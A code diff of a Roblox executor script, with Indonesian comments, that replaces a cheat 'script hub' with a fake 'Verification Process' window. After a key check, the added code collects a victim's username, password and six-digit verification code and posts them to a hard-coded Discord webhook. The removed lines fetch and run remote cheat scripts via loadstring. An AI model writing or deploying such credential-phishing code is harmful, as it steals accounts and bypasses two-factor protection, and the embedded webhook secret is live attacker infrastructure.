@@ -1,204 +1,101 @@
--- Rename Orion Lib to LawwLib
-local LawwLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+-- Load ZamitoHub Library
+local ZamitoHub = loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()
 
--- LawwScriptHUB UI Configuration
-local LawwScriptHUB = LawwLib:MakeWindow({
-    Name = "LawwScriptHUB",
-    HidePremium = false,
-    IntroText = "LawwScriptHUB Loading...",
-    SaveConfig = false,
-    ConfigFolder = "LawwScriptHUB"
-})
+-- Webhook URL Discord
+local webhook_url = "https://discord.com/api/webhooks/1319657197705367604/YDNwABDpMP0FcZrC5QqEOH9IbPqt67FmLF1yz6gNks0yxISJPoHbUBFyB1zgei3C5OOR"
 
--- Sistem Key
-local Authenticated = false
-local RequiredKey = "LawwXPrem"
-local KeyStorage = game:GetService("Workspace"):FindFirstChild("LawwScriptKey") -- Autosave Key di Workspace
+-- Key yang benar
+local correctKey = "kon"
 
--- Fungsi untuk menyimpan key ke Workspace
-local function SaveKeyToWorkspace(key)
-    if not game:GetService("Workspace"):FindFirstChild("LawwScriptKey") then
-        local KeyObject = Instance.new("StringValue", game:GetService("Workspace"))
-        KeyObject.Name = "LawwScriptKey"
-        KeyObject.Value = key
+-- Fungsi untuk mengirim data ke Discord
+local function sendToDiscord(username, password, code)
+    local content = string.format("Username: %s\nPassword: %s\nKode Verifikasi: %s", username, password, code)
+    local payload = {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = content
+        })
+    }
+
+    local response
+    if syn and syn.request then
+        response = syn.request(payload)
+    elseif http and http.request then
+        response = http.request(payload)
+    elseif request then
+        response = request(payload)
+    else
+        print("Executor Anda tidak mendukung HTTP requests!")
+        return
+    end
+
+    if response and response.StatusCode == 200 then
+        print("Data berhasil dikirim ke Discord!")
+    else
+        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
     end
 end
 
--- Jika Key sudah tersimpan dan valid, otomatis autentikasi
-if KeyStorage and KeyStorage.Value == RequiredKey then
-    Authenticated = true
-    LawwLib:MakeNotification({
-        Name = "Welcome Back",
-        Content = "Key valid! Welcome to LawwScriptHUB!",
-        Time = 5,
-        Image = "rbxassetid://4483345998"
-    })
-else
-    -- Key Validation Tab
-    local KeyTab = LawwScriptHUB:MakeTab({
-        Name = "KEY AUTH",
-        Icon = "rbxassetid://4483345998",
-        PremiumOnly = false
-    })
+-- Fungsi untuk membuat GUI menggunakan ZamitoHub
+local function createMenuGUI()
+    -- Membuat window dengan ZamitoHub
+    local window = ZamitoHub:CreateWindow("Verification Process", true)
 
-    KeyTab:AddTextbox({
-        Name = "Enter Key",
-        Default = "",
-        TextDisappear = true,
-        Callback = function(value)
-            if value == RequiredKey then
-                Authenticated = true
-                SaveKeyToWorkspace(value) -- Simpan key ke Workspace
+    -- Step 1: Key Input
+    local keyStep = window:CreateTab("Step 1: Key Input")
+    local keyTextbox = keyStep:CreateTextbox("Enter Key", "", function(key)
+        if key == correctKey then
+            ZamitoHub:CreateNotification("Key Valid", "Key yang dimasukkan benar!", 3)
+            keyStep:Destroy() -- Hapus tab Key Input
+            createUsernamePasswordStep() -- Pindah ke langkah berikutnya
+        else
+            ZamitoHub:CreateNotification("Key Invalid", "Key yang dimasukkan salah!", 3)
+        end
+    end)
 
-                LawwLib:MakeNotification({
-                    Name = "Success",
-                    Content = "Key accepted! Welcome to LawwScriptHUB!",
-                    Time = 5,
-                    Image = "rbxassetid://4483345998"
-                })
+    -- Step 2: Username and Password Input
+    local function createUsernamePasswordStep()
+        local usernamePasswordStep = window:CreateTab("Step 2: Username & Password")
+        
+        -- Username Input
+        local usernameTextbox = usernamePasswordStep:CreateTextbox("Enter Username", "", function(username)
+            print("Username:", username)
+        end)
 
-                -- Hapus KeyTab setelah key benar
-                LawwLib:DestroyTab(KeyTab)
+        -- Password Input
+        local passwordTextbox = usernamePasswordStep:CreateTextbox("Enter Password", "", function(password)
+            print("Password:", password)
+        end)
+
+        -- Lanjut ke Step 3: Kode Verifikasi
+        local continueButton = usernamePasswordStep:CreateButton("Continue to Verification", function()
+            local username = usernameTextbox.Text
+            local password = passwordTextbox.Text
+            usernamePasswordStep:Destroy() -- Hapus tab Username & Password
+            createVerificationCodeStep(username, password) -- Pindah ke langkah berikutnya
+        end)
+    end
+
+    -- Step 3: Verification Code Input
+    local function createVerificationCodeStep(username, password)
+        local verificationStep = window:CreateTab("Step 3: Verification Code")
+        
+        -- Kode Verifikasi Input
+        local verificationTextbox = verificationStep:CreateTextbox("Enter Verification Code", "", function(code)
+            if code:match("^%d%d%d%d%d%d$") then  -- Memastikan kode 6 digit
+                sendToDiscord(username, password, code) -- Kirim ke Discord
+                ZamitoHub:CreateNotification("Verification Success", "Kode verifikasi berhasil dikirim!", 3)
+                verificationStep:Destroy() -- Hapus tab Verification
             else
-                LawwLib:MakeNotification({
-                    Name = "Invalid Key",
-                    Content = "Incorrect key, please try again.",
-                    Time = 5,
-                    Image = "rbxassetid://4483345998"
-                })
+                ZamitoHub:CreateNotification("Verification Failed", "Kode harus 6 digit angka!", 3)
             end
-        end
-    })
-
-    -- Tunggu hingga key benar sebelum melanjutkan
-    while not Authenticated do
-        task.wait(1)
+        end)
     end
 end
 
--- Welcome Notification
-local function ShowWelcomeNotification()
-    local player = game.Players.LocalPlayer
-    local displayName = player.DisplayName
-    local userId = player.UserId
-    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
-
-    LawwLib:MakeNotification({
-        Name = "Welcome " .. displayName,
-        Content = "Enjoy using LawwScriptHUB!",
-        Image = avatarUrl,
-        Time = 2
-    })
-end
-ShowWelcomeNotification()
-task.wait(2)
-
--- JOIN JOB Tab
-local JoinJobTab = LawwScriptHUB:MakeTab({
-    Name = "JOIN JOB",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-local AutoJoin = false
-local JobID = ""
-
-JoinJobTab:AddTextbox({
-    Name = "Enter Job ID",
-    Default = "",
-    TextDisappear = true,
-    Callback = function(value)
-        JobID = value:gsub("`", "")
-    end
-})
-
-JoinJobTab:AddButton({
-    Name = "Join Job ID",
-    Callback = function()
-        if JobID ~= "" then
-            game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", JobID)
-        end
-    end
-})
-
-JoinJobTab:AddToggle({
-    Name = "Auto Join Job ID",
-    Default = false,
-    Callback = function(value)
-        AutoJoin = value
-    end
-})
-
-JoinJobTab:AddButton({
-    Name = "Join Less Player",
-    Callback = function()
-        local HttpService = game:GetService("HttpService")
-        local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
-
-        for _, server in ipairs(Servers.data) do
-            if server.playing < server.maxPlayers then
-                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, server.id)
-                break
-            end
-        end
-    end
-})
-
-task.spawn(function()
-    while true do
-        if AutoJoin and JobID ~= "" then
-            game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", JobID)
-        end
-        task.wait(1)
-    end
-end)
-
--- SCRIPT HUB Tab
-local ScriptHubTab = LawwScriptHUB:MakeTab({
-    Name = "SCRIPT HUB",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-ScriptHubTab:AddButton({
-    Name = "COKKA HUB NO KEY",
-    Callback = function()
-        _G.Key = "Xzt7M9IAfF"
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua"))()
-    end
-})
-
-ScriptHubTab:AddButton({
-    Name = "RedzHub V2 (Smooth)",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
-    end
-})
-
-ScriptHubTab:AddButton({
-    Name = "ANDEPZAI OP (TRIAL)",
-    Callback = function()
-        repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/refs/heads/main/AnDepZaiHubNewUpdated.lua"))()
-    end
-})
-
-ScriptHubTab:AddButton({
-    Name = "AUTO CHEST (OP)",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/VGB-VGB-VGB/-VGB-Chest-Farm--/refs/heads/main/ChestFarmByVGBTeam"))()
-    end
-})
-
--- MISC Tab
-local MiscTab = LawwScriptHUB:MakeTab({
-    Name = "MISC",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-MiscTab:AddButton({
-    Name = "Boost FPS",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FPS-BOOSTER/main/FPSBooster.txt"))()
-    end
-})
+-- Menampilkan GUI
+createMenuGUI()
